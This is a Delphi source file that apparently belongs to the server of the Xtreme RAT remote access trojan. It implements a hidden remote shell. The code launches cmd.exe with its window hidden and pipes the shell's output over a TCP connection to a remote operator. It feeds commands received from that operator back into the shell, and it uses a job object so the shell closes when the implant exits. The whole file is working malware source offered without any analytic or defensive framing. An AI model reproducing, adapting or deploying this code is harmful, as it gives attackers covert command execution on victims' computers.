unit UnitShell;

interface

uses
  SysUtils,
  Windows,
  UnitNewConnection,
  UnitConstantes,
  UnitConexao,
  Classes;

type
  TNewShell = class(TThread)
  private
    IdTCPClient1: TIdTCPClientNew;
  protected
    procedure Execute; override;
  public
    constructor Create(xIdTCPClient1: TIdTCPClientNew);
  end;

var
  ComandoShell: widestring;

implementation

uses
  GlobalVars,
  Jobs;

constructor TNewShell.Create(xIdTCPClient1: TIdTCPClientNew);
begin
  IdTCPClient1 := xIdTCPClient1;
  inherited Create(True);
end;

function AnsiStringToWideStringCP(const AString: AnsiString; const CP: Cardinal): WideString;
var
  Len: Integer;
begin
  Len := MultiByteToWideChar(CP, 0, PAnsiChar(AString), Length(AString), nil, 0);
  SetLength(Result, Len);
  if Len > 0 then
  begin
    Len := MultiByteToWideChar(CP, 0, PAnsiChar(AString), Length(AString),
      PWideChar(Result), Len);
    if Len = 0 then Abort;
  end;
end;

function GetRealString(MS: TMemoryStream): widestring;
var
  s: widestring;
  c: widechar;
  b: byte;
  Header: array [0..1] of byte;
  isUnicode: boolean;
  i: integer;
begin
  result := '';
  if MS.Size <= 0 then exit;
  MS.Position := 0;

  MS.Read(Header, sizeof(Header));
  isUnicode := (Header[0] <> 0) and (Header[1] <> 0);
  MS.Position := 0;
  if isUnicode then
  begin
    while MS.Position < MS.Size do
    begin
      MS.Read(b, sizeof(b));
      Result := Result + AnsiStringToWideStringCP(AnsiChar(b), GetOEMCP);
    end;
  end else
  begin
    while MS.Position < MS.Size do
    begin
      MS.Read(c, sizeof(c));
      Result := Result + c;
    end;
  end;
end;

type
  PStartupInfoA = ^TStartupInfoA;
  PStartupInfoW = ^TStartupInfoW;
  PStartupInfo = PStartupInfoW;
  _STARTUPINFOA = record
    cb: DWORD;
    lpReserved: PAnsiChar;
    lpDesktop: PAnsiChar;
    lpTitle: PAnsiChar;
    dwX: DWORD;
    dwY: DWORD;
    dwXSize: DWORD;
    dwYSize: DWORD;
    dwXCountChars: DWORD;
    dwYCountChars: DWORD;
    dwFillAttribute: DWORD;
    dwFlags: DWORD;
    wShowWindow: Word;
    cbReserved2: Word;
    lpReserved2: PByte;
    hStdInput: THandle;
    hStdOutput: THandle;
    hStdError: THandle;
  end;
  _STARTUPINFOW = record
    cb: DWORD;
    lpReserved: PWideChar;
    lpDesktop: PWideChar;
    lpTitle: PWideChar;
    dwX: DWORD;
    dwY: DWORD;
    dwXSize: DWORD;
    dwYSize: DWORD;
    dwXCountChars: DWORD;
    dwYCountChars: DWORD;
    dwFillAttribute: DWORD;
    dwFlags: DWORD;
    wShowWindow: Word;
    cbReserved2: Word;
    lpReserved2: PByte;
    hStdInput: THandle;
    hStdOutput: THandle;
    hStdError: THandle;
  end;
  _STARTUPINFO = _STARTUPINFOW;
  TStartupInfoA = _STARTUPINFOA;
  TStartupInfoW = _STARTUPINFOW;
  TStartupInfo = TStartupInfoW;
  {$EXTERNALSYM STARTUPINFOA}
  STARTUPINFOA = _STARTUPINFOA;
  {$EXTERNALSYM STARTUPINFOW}
  STARTUPINFOW = _STARTUPINFOW;
  {$EXTERNALSYM STARTUPINFO}
  STARTUPINFO = STARTUPINFOW;

function CreateProcessW(lpApplicationName: PWideChar; lpCommandLine: PWideChar;
  lpProcessAttributes, lpThreadAttributes: PSecurityAttributes;
  bInheritHandles: BOOL; dwCreationFlags: DWORD; lpEnvironment: Pointer;
  lpCurrentDirectory: PWideChar; const lpStartupInfo: TStartupInfoW;
  var lpProcessInformation: TProcessInformation): BOOL; stdcall; external kernel32 name 'CreateProcessW';

procedure TNewShell.Execute;
const
  MAX_CHUNK: dword = {8192}65536;
var
  Buffer: array [0..{4095}32767] of WideChar;
  SecurityAttributes: SECURITY_ATTRIBUTES;
  hiRead, hoRead, hiWrite, hoWrite: THandle;
  StartupInfo: TSTARTUPINFOW;
  ProcessInfo: TProcessInformation;
  BytesRead, BytesWritten, ExitCode, PipeMode: dword;
  ComSpec: array [0..MAX_PATH] of Widechar;
  ToSend, Tempstr, Tempstr1: widestring;
  i: integer;
  c: cardinal;
  MS: TMemoryStream;
  jel: TJobObjectExtendedLimitInformation;
  hJob: THandle;
begin
  SecurityAttributes.nLength := SizeOf(SECURITY_ATTRIBUTES);
  SecurityAttributes.lpSecurityDescriptor := nil;
  SecurityAttributes.bInheritHandle := True;
  CreatePipe(hiRead, hiWrite, @SecurityAttributes, 0);
  CreatePipe(hoRead, hoWrite, @SecurityAttributes, 0);

  StartupInfo.hStdOutput := hoWrite;
  StartupInfo.hStdError := hoWrite;
  StartupInfo.hStdInput := hiRead;
  StartupInfo.dwFlags := STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES;
  StartupInfo.wShowWindow := SW_HIDE;

  TempStr := 'COMSPEC';
  GetEnvironmentVariableW(pWideChar(TempStr), ComSpec, sizeof(ComSpec));
  TempStr := WideString(ComSpec) + ' /U';

  CreateProcessW(nil, pWideChar(TempStr), nil, nil, True, CREATE_NEW_CONSOLE or CREATE_BREAKAWAY_FROM_JOB, nil, nil, StartupInfo, ProcessInfo);


  // Após uma finalização inesperada do processo do server, o processo do prompt (cmd.exe) continuava ativo.
  // Dessa maneira, ele fecha assim que o processo do servidor for finalizado.
  hJob := CreateJobObject(nil, 'Xtreme');
  FillChar(jel, sizeof(jel), 0);
  jel.BasicLimitInformation.LimitFlags := JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
  SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, @jel, sizeof(jel));
  AssignProcessToJobObject(hJob, ProcessInfo.hProcess);



  CloseHandle(hoWrite);
  CloseHandle(hiRead);
  PipeMode := PIPE_NOWAIT;
  SetNamedPipeHandleState(hoRead, PipeMode , nil, nil);

  TempStr := '';

  sleep(1000);
  MS := TMemoryStream.Create;
  repeat
    ReadFile(hoRead, Buffer, MAX_CHUNK, BytesRead, nil);
    if BytesRead > 0 then MS.Write(Buffer[0], BytesRead);
  until BytesRead < MAX_CHUNK;
  TempStr := GetRealString(MS);
  MS.Free;

  if TempStr = '' then
  begin
    GetExitCodeProcess(ProcessInfo.hProcess, ExitCode);
    if ExitCode = STILL_ACTIVE then TerminateProcess(ProcessInfo.hProcess, 0);
    CloseHandle(hoRead);
    CloseHandle(hiWrite);

    ToSend := SHELL + '|' + SHELLDESATIVAR + '|';
    try
      IdTCPClient1.EnviarString(ToSend);
      finally
      try
        IdTCPClient1.Disconnect;
        except
      end;
    end;
  end;

  ToSend := SHELL + '|' + SHELLCOMMAND + '|' + TempStr;
  IdTCPClient1.EnviarString(ToSend);
  TempStr := '';
  ComandoShell := '';

  while (IdTCPClient1.Connected = true) and (GlobalVars.MainIdTCPClient <> nil) and (GlobalVars.MainIdTCPClient.Connected = True) do
  begin
    Sleep(10);
    GetExitCodeProcess(ProcessInfo.hProcess, ExitCode);
    if ExitCode <> STILL_ACTIVE then Break;

    MS := TMemoryStream.Create;
    repeat
      ZeroMemory(@Buffer, SizeOf(Buffer));
      ReadFile(hoRead, Buffer, MAX_CHUNK, BytesRead, nil);
      if BytesRead > 0 then MS.Write(Buffer[0], BytesRead);
    until BytesRead < MAX_CHUNK;
    TempStr := TempStr + GetRealString(MS);
    MS.Free;

    if TempStr <> '' then
    begin
      ToSend := SHELL + '|' + SHELLCOMMAND + '|' + TempStr;
      IdTCPClient1.EnviarString(ToSend);
      TempStr := '';
    end;

    if ComandoShell <> '' then
    begin
      WriteFile(hiWrite, pansichar(ansistring(ComandoShell))^, length(ComandoShell), BytesWritten, nil);
      ComandoShell := '';
      Tempstr := #10#13;
      WriteFile(hiWrite, pansichar(ansistring(Tempstr))^, 2, BytesWritten, nil);
      Tempstr := '';
    end;
  end;

  GetExitCodeProcess(ProcessInfo.hProcess, ExitCode);
  if ExitCode = STILL_ACTIVE then TerminateProcess(ProcessInfo.hProcess, 0);
  TerminateJobObject(hJob, 0);

  CloseHandle(hoRead);
  CloseHandle(hiWrite);

  ToSend := SHELL + '|' + SHELLDESATIVAR + '|';
  try
    IdTCPClient1.EnviarString(ToSend);
    finally
    try
      IdTCPClient1.Disconnect;
      except
    end;
  end;
end;

end.
